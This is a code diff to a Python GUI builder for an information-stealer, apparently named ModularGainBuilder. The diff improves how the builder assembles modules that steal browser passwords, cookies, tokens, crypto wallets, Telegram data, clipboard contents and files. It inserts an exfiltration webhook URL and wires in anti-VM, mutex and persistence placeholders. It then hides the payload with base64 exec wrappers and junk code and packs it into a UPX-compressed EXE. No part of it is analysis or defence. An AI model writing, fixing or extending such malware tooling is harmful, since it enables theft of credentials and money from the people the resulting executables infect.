@@ -4,10 +4,11 @@ import os
 import json
 import tempfile
 import base64
-import requests
+import random
+import string
 import subprocess
 import sys
-import threading
+import requests
 from datetime import datetime
 
 class ModularGainBuilder:
@@ -246,6 +247,9 @@ class ModularGainBuilder:
             self.log("Error: Modules not downloaded. Click 'Download Modules' first.")
             return
         
+        # Check raw modules for placeholders
+        self.check_raw_modules()
+        
         self.log("Building stealer code...")
         
         try:
@@ -255,12 +259,19 @@ class ModularGainBuilder:
             if 'imports' in self.modules:
                 final_code += self.modules['imports'] + "\n\n"
             
-            # 2. Config
+            # 2. Config - FIXED: Çift tırnak problemi
             if 'config' in self.modules:
-                config_code = self.modules['config'].replace(
-                    "{WEBHOOK_URL}", 
-                    f'"{self.webhook_var.get()}"'
-                )
+                webhook_url = self.webhook_var.get().strip()
+                # Eğer config'de zaten tırnaklar varsa, sadece URL'yi değiştir
+                if '{WEBHOOK_URL}' in self.modules['config']:
+                    # URL'yi tırnak içine al
+                    webhook_with_quotes = f'"{webhook_url}"'
+                    config_code = self.modules['config'].replace('{WEBHOOK_URL}', webhook_with_quotes)
+                else:
+                    # Config'de WEBHOOK_URL = "..." formatı varsa, regex ile değiştir
+                    import re
+                    config_code = re.sub(r'WEBHOOK_URL\s*=\s*".*?"', f'WEBHOOK_URL = "{webhook_url}"', self.modules['config'])
+                
                 final_code += config_code + "\n\n"
             
             # 3. Anti-analysis (with conditions)
@@ -297,18 +308,41 @@ class ModularGainBuilder:
                 if module_name in self.modules and self.features[feature_key].get():
                     final_code += self.modules[module_name] + "\n\n"
             
-            # 5. Data handler
+            # 5. Data handler - FIXED: Placeholder kontrolü
             if 'data_handler' in self.modules:
                 data_code = self.modules['data_handler']
                 
-                # Build conditions for each feature
-                conditions = ""
-                for module_name, feature_key in feature_modules:
-                    if self.features[feature_key].get():
-                        conditions += f"    if {str(self.features[feature_key].get()).lower()}:\n"
-                        conditions += f"        data['{feature_key}'] = {feature_key.replace('_', '')}()\n"
+                # Eğer data_handler'da {FEATURE_CONDITIONS} placeholder'ı yoksa,
+                # zaten düzgün çalışan bir kod olduğunu varsayalım
+                if "{FEATURE_CONDITIONS}" in data_code:
+                    # Build conditions for each feature
+                    conditions = ""
+                    for module_name, feature_key in feature_modules:
+                        if self.features[feature_key].get():
+                            # Fonksiyon ismini doğru al (örn: passwords -> stealpasswords)
+                            func_name = ''
+                            if feature_key == 'passwords': func_name = 'stealpasswords'
+                            elif feature_key == 'cookies': func_name = 'stealcookies'
+                            elif feature_key == 'tokens': func_name = 'stealtokens'
+                            elif feature_key == 'wallets': func_name = 'stealwallets'
+                            elif feature_key == 'system_info': func_name = 'getsysteminfo'
+                            elif feature_key == 'clipboard': func_name = 'monitorclipboard'
+                            elif feature_key == 'telegram': func_name = 'stealtelegram'
+                            elif feature_key == 'files': func_name = 'grabfiles'
+                            
+                            if func_name:
+                                conditions += f"    # {feature_key}\n"
+                                conditions += f"    try:\n"
+                                conditions += f"        {feature_key} = {func_name}()\n"
+                                conditions += f"        if {feature_key}:\n"
+                                conditions += f"            data['{feature_key}'] = {feature_key}\n"
+                                conditions += f"            with open(os.path.join(data_dir, '{feature_key}.json'), 'w', encoding='utf-8') as f:\n"
+                                conditions += f"                json.dump({feature_key}, f, indent=2)\n"
+                                conditions += f"    except:\n"
+                                conditions += f"        pass\n\n"
+                    
+                    data_code = data_code.replace("{FEATURE_CONDITIONS}", conditions)
                 
-                data_code = data_code.replace("{FEATURE_CONDITIONS}", conditions)
                 final_code += data_code + "\n\n"
             
             # 6. Main code
@@ -318,12 +352,15 @@ class ModularGainBuilder:
             # Apply obfuscation
             if self.obfuscation['remove_comments'].get():
                 final_code = self.remove_comments(final_code)
+                self.log("Removed comments")
             
             if self.obfuscation['base64_encode'].get():
                 final_code = self.base64_encode(final_code)
+                self.log("Applied Base64 encoding")
             
             if self.obfuscation['add_junk'].get():
                 final_code = self.add_junk_code(final_code)
+                self.log("Added junk code")
             
             # Save Python file
             output_name = self.output_var.get().strip() or "gain"
@@ -332,16 +369,38 @@ class ModularGainBuilder:
             with open(py_filename, 'w', encoding='utf-8') as f:
                 f.write(final_code)
             
-            self.log(f"✓ Python script saved: {py_filename}")
+            self.log(f"✓ Python script saved: {os.path.abspath(py_filename)}")
             
             # Compile to EXE if requested
             if compile_exe and self.compile_exe.get():
                 self.compile_to_exe(py_filename, output_name)
+            else:
+                messagebox.showinfo("Success", f"Python script saved:\n{os.path.abspath(py_filename)}")
             
         except Exception as e:
             self.log(f"✗ Build error: {str(e)}")
             import traceback
             self.log(traceback.format_exc())
+            messagebox.showerror("Build Error", str(e))
+    
+    def check_raw_modules(self):
+        """Check if all raw modules have required placeholders"""
+        self.log("Checking module placeholders...")
+        
+        required_placeholders = {
+            'config': ['{WEBHOOK_URL}'],
+            'anti_analysis': ['{ANTI_VM}', '{STARTUP_DELAY}', '{DELAY_SECONDS}', '{MUTEX}', '{PERSIST}'],
+            'data_handler': ['{FEATURE_CONDITIONS}']
+        }
+        
+        for module_name, placeholders in required_placeholders.items():
+            if module_name in self.modules:
+                module_code = self.modules[module_name]
+                for placeholder in placeholders:
+                    if placeholder in module_code:
+                        self.log(f"✓ {module_name} has placeholder: {placeholder}")
+                    else:
+                        self.log(f"⚠ {module_name} missing placeholder: {placeholder}")
     
     def remove_comments(self, code):
         lines = code.split('\n')
@@ -355,13 +414,14 @@ class ModularGainBuilder:
     
     def base64_encode(self, code):
         encoded = base64.b64encode(code.encode()).decode()
-        wrapper = f'''
-import base64
-exec(base64.b64decode("{encoded}"))
-'''
+        wrapper = f'''import base64
+exec(base64.b64decode("{encoded}"))'''
         return wrapper
     
     def add_junk_code(self, code):
+        import random
+        import string
+        
         junk_lines = [
             '# ' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)),
             'junk_var_' + str(random.randint(1000, 9999)) + ' = "' + ''.join(random.choices(string.ascii_letters, k=20)) + '"',
@@ -382,6 +442,22 @@ exec(base64.b64decode("{encoded}"))
         self.log("Compiling to EXE...")
         
         try:
+            # Check if PyInstaller is installed
+            try:
+                subprocess.run(['pyinstaller', '--version'], 
+                              capture_output=True, shell=True, timeout=5)
+                self.log("✓ PyInstaller found")
+            except:
+                self.log("PyInstaller not found. Installing...")
+                result = subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], 
+                                      capture_output=True, text=True, shell=True)
+                if result.returncode == 0:
+                    self.log("✓ PyInstaller installed")
+                else:
+                    self.log(f"✗ Failed to install PyInstaller: {result.stderr}")
+                    return
+            
+            # Build PyInstaller command
             pyinstaller_cmd = [
                 'pyinstaller',
                 '--onefile',
@@ -391,28 +467,70 @@ exec(base64.b64decode("{encoded}"))
                 '--hidden-import=win32timezone',
                 '--hidden-import=win32crypt',
                 '--hidden-import=Crypto.Cipher',
+                '--hidden-import=Crypto.Util.Padding',
                 '--hidden-import=browser_cookie3',
-                py_filename
+                '--hidden-import=requests',
+                '--hidden-import=psutil',
+                '--add-data=*;.',
+                '--clean'
             ]
             
-            self.log(f"Running: {' '.join(pyinstaller_cmd)}")
+            # Add UPX if available
+            try:
+                subprocess.run(['upx', '--version'], capture_output=True, shell=True)
+                pyinstaller_cmd.append('--upx-exclude=vcruntime140.dll')
+                self.log("✓ UPX found, will use compression")
+            except:
+                self.log("ℹ UPX not available")
             
-            result = subprocess.run(pyinstaller_cmd, 
+            self.log(f"Running PyInstaller...")
+            
+            result = subprocess.run(pyinstaller_cmd + [py_filename], 
                                   capture_output=True, 
                                   text=True, 
-                                  shell=True)
+                                  shell=True,
+                                  timeout=300)  # 5 minute timeout
             
             if result.returncode == 0:
                 exe_path = os.path.join('dist', output_name + '.exe')
                 if os.path.exists(exe_path):
-                    self.log(f"✓ EXE built: {exe_path}")
+                    exe_size = os.path.getsize(exe_path) / 1024 / 1024
+                    self.log(f"✓ EXE built successfully: {os.path.abspath(exe_path)}")
+                    self.log(f"✓ Size: {exe_size:.2f} MB")
+                    
+                    # Try to compress with UPX separately
+                    try:
+                        subprocess.run(['upx', '--best', '--lzma', exe_path], 
+                                     capture_output=True, shell=True)
+                        compressed_size = os.path.getsize(exe_path) / 1024 / 1024
+                        self.log(f"✓ UPX compressed: {compressed_size:.2f} MB")
+                    except:
+                        pass
+                    
+                    messagebox.showinfo("Success", 
+                                      f"Build completed!\n\n"
+                                      f"Python: {os.path.abspath(py_filename)}\n"
+                                      f"EXE: {os.path.abspath(exe_path)}\n"
+                                      f"Size: {exe_size:.2f} MB")
                 else:
-                    self.log("✗ EXE not found")
+                    self.log("✗ EXE not found in dist folder")
+                    self.log(f"PyInstaller output: {result.stdout}")
             else:
-                self.log(f"✗ PyInstaller error: {result.stderr}")
+                self.log(f"✗ PyInstaller failed with code: {result.returncode}")
+                self.log(f"PyInstaller stderr: {result.stderr[:500]}...")
+                self.log(f"PyInstaller stdout: {result.stdout[:500]}...")
+                
+                # Common error solutions
+                if "No module named" in result.stderr:
+                    missing_module = result.stderr.split("No module named")[1].split("'")[1]
+                    self.log(f"Try: pip install {missing_module}")
         
+        except subprocess.TimeoutExpired:
+            self.log("✗ PyInstaller timed out (5 minutes)")
         except Exception as e:
             self.log(f"✗ Compilation error: {str(e)}")
+            import traceback
+            self.log(traceback.format_exc())
 
 if __name__ == "__main__":
     root = tk.Tk()
